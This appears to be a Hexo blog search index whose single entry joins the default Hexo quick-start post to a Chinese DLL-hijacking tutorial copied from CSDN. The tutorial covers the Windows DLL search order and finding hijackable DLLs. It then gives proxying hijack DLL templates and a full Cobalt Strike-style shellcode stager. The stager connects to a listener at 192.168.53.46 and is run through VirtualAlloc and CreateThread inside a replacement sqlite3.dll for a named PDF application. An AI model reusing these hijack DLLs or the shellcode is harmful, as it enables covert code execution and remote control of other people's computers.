<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/06/14/hello-world/"/>
    <url>/2022/06/14/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo new post 测试文章<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p>dll是什么<br>dll为动态链接库文件，又称”应用程序拓展”，是软件文件类型。在Windows中许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库文件，即dll文件，放置于系统中，个人理解类似于我们编程中引入的模块。</p><p>静态编译:debug状态下：MTd release状态下：MT</p><p>动态编译:debug状态下：MDd release状态下：MD</p><p>动态编译的生成的可执行文件的exe小，但是运行需要系统环境具有相关的dll和lib文件，就是动态调用系统相关的文件才能运行；</p><p>静态编译生成的可执行文件exe大，但是运行的时候不依赖于系统环境所依赖的dll和lib等环境问题，在编译的时候已经这些dll相关文件编译进了exe文件，所以exe文件较大。所以需要自己创建的工程需要在别的电脑上运行，考虑到稳定性，同时对执行文件的大小没有要求的话还是尽量选择静态编译。</p><p>dll劫持漏洞原理<br>如果在一个进程加载dll时没有指定dll的绝对路径，那么windows会尝试去按照顺序搜索这些特定目录来查找这个dll。如果攻击者将恶意的dll放在优先于正常dll所在目录，那么就能够欺骗系统去加载恶意的dll,形成dll劫持。</p><p>DLL路径搜索目录顺序<br>程序加载目录<br>系统目录。使用GetSystemDirectory获取该路径<br>16位系统目录<br>windows目录，使用GetWindowsDirectory获取该路径<br>windows当前目录<br>PATH环境变量中列出的目录<br>Know Dlls注册表项<br>从windows7之后，微软为了更进一步的防御系统的dll劫持，将一些容易被劫持的系统dll写进了一个注册表项中，那么凡是在此项目下的dll文件就会被禁止从exe自身所在目录下调用，而只能从系统目录即system32目录下调用</p><p>默认情况下：<br>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode<br>1<br>处于开启状态，如果手动设置为0，关闭该安全选项，搜索顺序为：在以上顺序的基础上，将 当前目录 修改至 系统目录 的位置，其他顺移。</p><p>另外当前应用程序加载dll时如果仅指定dll名称时，那么将按照以上顺序搜索dll文件，不过在加载之前还需要满足以下两条规范：<br>1.当内存中已加载相同模块名称的dll时，系统将直接夹在该dll,不会进行搜索，除非设置了dll重定向选项<br>2.如果要加载的dll模块属于known dlls，系统直接加载系统目录下的该dll，不会进行搜索</p><p>windows操作系统通过”dll路径搜索目录顺序”和“known dlls注册表项”来确定应用程序所要调用的dll的路径，当一个进程尝试加载一个dll的时候，会先尝试搜索程序所处的目录，若还没有找到，则向下搜索16位系统目录即system目录，然后windows目录，当前目录，path环境变量的各个目录。</p><p>这样的加载顺序很容易就会导致一个系统的dll被劫持，只要攻击者将目标文件和恶意dll放在一起即可导致恶意dll搜索顺序优先于系统dll目录加载，就能够欺骗系统去加载恶意的dll，形成”dll劫持”。</p><p>手动劫持<br>劫持程序运行时加载的未知dll<br>用到的工具 Process Monitor v3.60<br>通过process monitor监控dll调用是一种最基础的寻找dll劫持的方式<br>设置过滤规则:(默认的不需要改变)<br>Path ends with .dll<br>Result is NAME NOT FOUND<br>Process Name contains 进程名称<br>1<br>2<br>3</p><p>然后这里找到一个需要用到loadlibrary这个api的dll，这里找有个api的原因是因为如果该dll的调用栈中存在有 **loadlibrary(Ex) * *,说明这个dll被进程所动态加载的。如果这种利用场景下，伪造的dll文件不需要存在任何导出函数即可被成功加载，即使加载后进程内部出错，也是在dll被加载成功加载之后的事情。<br>loadlibrary和loadlibraryex是一个本地加载，一个是远程加载，如果dll不在调用的同一目录下，就可以使用loadlibrary(L”DLL绝对路径”)加载。但是如果DLL内部又调用一个DLL，就需要使用loadlibraryex进行远程加载</p><p>LoadLibraryEx(“DLL绝对路径”, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);<br>1<br>LoadLibraryEx的最后一个参数设置为load_With_altered_Search_path即可让系统dll搜索顺序从我们设置的目录开始</p><p>找到可以被劫持的dll文件</p><p>编写恶意的dll</p><p>&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。<br>#include “pch.h”<br>#include &lt;stdlib.h&gt;</p><p>BOOL APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>{<br>    switch (ul_reason_for_call)<br>    {<br>    case DLL_PROCESS_ATTACH:<br>    system(“calc”);<br>    case DLL_THREAD_ATTACH:<br>    case DLL_THREAD_DETACH:<br>    case DLL_PROCESS_DETACH:<br>        break;<br>    }<br>    return TRUE;<br>}<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>用vs创建dll项目，并生成</p><p>劫持程序某个功能调用的dll文件<br>某个exe程序运行的时候，监控某个功能(例如截图)所调用的dll文件<br>1.使用CFFExplorer工具查看该文件(dll文件名为B)，导出目录里的kerbel32.dll里是否调用了LoadLibrary<br>2.如果调用了LoadLibrary,则在导出目录找导出的函数名(函数名为C)<br>3.自己编写dll，重命名为B.dll，将原先的B.dll重命名为B_origin.dll。B.dll代码里用LoadLibrary调用B_origin.dll<br>4.运行该程序的某个功能，即可劫持<br>代码demo<br>extern导出函数的代码可以用rundll32 dllExtern.dll test(函数名) 调用extern “C” extern “C”使得在C++中使用c编译方式成为可能。在c++下定义c函数，需要加extern “C”关键字。用extern “C”来指明该函数使用c编译方式。输出的”c”函数可以从”c”代码里调用<br>__declspec(dllexport)的作用就是让编译器按照某种预定的方式来输出导出函数及变量的符号</p><p>动态链接库文件中包含若干公用的代码、数据库等。供其他模块使用。动态链接库是将应用程序模块化的重要方法、动态链接库中的函数和数据可以同时供其他多个可执行文件使用，不同的可执行文件可以调用同一个动态链接库中的函数。DLL中函数经过”导出”后可以被exe文件中的程序调用<br>1<br>#include &lt;Windows.h&gt; &#x2F;&#x2F; 这是导出变量的一个示例<br>extern “C” _declspec(dllexport) void __cdecl test(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow)<br>{<br> WinExec(“calc.exe”, SW_HIDE);<br>  return;<br>  }<br>1<br>2<br>3<br>4<br>5<br>6</p><p>#劫持dll的代码模板<br>#假设程序加载的dll名字为B，B.dll的导出函数为C<br>#劫持的dll名字改为B<br>#B.dll改为B_Origin.dll<br>#PrScrn改为C<br>#PrScrn_Origial.dll改为B_Origin.dll<br>#include &lt;Windows.h&gt;<br>extern “C” __declspec(dllexport) void PrScrn();<br>BOOL APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>{<br>    switch (ul_reason_for_call)<br>    {<br>    case DLL_PROCESS_ATTACH:<br>        WinExec(“calc.exe”, SW_HIDE);            &#x2F;&#x2F;我们要攻击的恶意代码<br>    case DLL_THREAD_ATTACH:<br>    case DLL_THREAD_DETACH:<br>    case DLL_PROCESS_DETACH:<br>        break;<br>    }<br>    return TRUE;<br>}<br>void PrScrn()<br>{<br>    MessageBox(NULL, L”DLL Hijack! by DLLHijacker!”, L”:)”, 0);  &#x2F;&#x2F;我们要攻击的恶意代码<br>    HINSTANCE hDllInst &#x3D; LoadLibrary(L”PrScrn_Origial.dll”);<br>    if (hDllInst)<br>    {<br>        typedef DWORD(WINAPI *EXPFUNC)();<br>        EXPFUNC exportFunc &#x3D; NULL;<br>        exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, “PrScrn”);<br>        if (exportFunc)<br>        {<br>            exportFunc();<br>        }<br>        FreeLibrary(hDllInst);<br>    }<br>    return;<br>}<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>实验：<br>process monitor做以下规则</p><p>Path ends with .dll<br>Result is SUCCESS<br>Process Name contains 进程名称<br>1<br>2<br>3</p><p>使用CFFExplorer查看目标dll文件</p><p>任选一个函数(存在LoadLibraryExW的dll文件的导出目录如果是多个函数，每个函数都可以劫持！)</p><p>#include &lt;Windows.h&gt;<br>#include “pch.h”<br>extern “C” __declspec(dllexport) void beNotified();<br>BOOL APIENTRY DllMain(<br>    HMODULE hModule,<br>    DWORD ul_reason_for_call,<br>    LPVOID lpReserved<br>) {<br>    switch (ul_reason_for_call) {<br>    case DLL_PROCESS_ATTACH:<br>        WinExec(“calc.exe”, SW_HIDE); &#x2F;&#x2F;我们要攻击的恶意代码<br>    case DLL_THREAD_ATTACH:<br>    case DLL_THREAD_DETACH:<br>    case DLL_PROCESS_DETACH:<br>        break;<br>    }<br>    return TRUE;<br>}<br>void beNotified() {<br>    MessageBox(NULL, L”DLL Hijack! by DLLHijacker!”, L”:)”, 0); &#x2F;&#x2F;我们要攻击的恶意代码<br>    HINSTANCE hDllInst &#x3D; LoadLibrary(L”NppCoverter_Origial.dll”);<br>    if (hDllInst) {<br>        typedef DWORD(WINAPI *EXPFUNC)();<br>        EXPFUNC exportFunc &#x3D; NULL;<br>        exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, “beNotified”);<br>        if (exportFunc) {<br>            exportFunc();<br>        }<br>        FreeLibrary(hDllInst);<br>    }<br>    return;<br>}<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32</p><p>将编译好的文件放到目标dll同目录下，并且重命名为NppCoverter.dll。原先的NppCoverter.dll重命名为NppCoverter_Origial.dll</p><p>执行程序</p><p>aheadlib工具劫持<br>这里演示程序为极速pdf<br><a href="https://jisupdf.com/">https://jisupdf.com/</a><br>安装好有得到如下文件</p><p>这里先用cobalt strike生成payload</p><p>设置好监听，然后生成</p><p>打开工具aheadlib,然后这里以sqlite3.dll为例</p><p>然后就会生成一个cpp文件<br>新建一个dll项目</p><p>将生成的cpp文件覆盖到dllmain.cpp文件中</p><pre><code class="hljs">unsigned char buf[] = &quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x90\x1f\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x74\x47\x39\x68\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x41\x55\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x35\x33\x2e\x34\x36\x00\x00\x00\x00\x00&quot;;void *exec = VirtualAlloc(0,sizeof(buf),MEM_COMMIT,PAGE_EXECUTE_READWRITE);memcpy(exec,buf,sizeof(buf));CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);//创建线程运行shellcode</code></pre><p>1<br>2<br>3<br>4<br>5</p><p>然后生成文件<br>将生成的dll文件和原dll文件进行替换</p><p>注意payload的位数要和生产dll文件的位数一致</p><p>参考链接：<a href="https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/">https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/</a><br>————————————————<br>版权声明：本文为CSDN博主「. iDea.」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_46804551/article/details/124546603">https://blog.csdn.net/qq_46804551/article/details/124546603</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
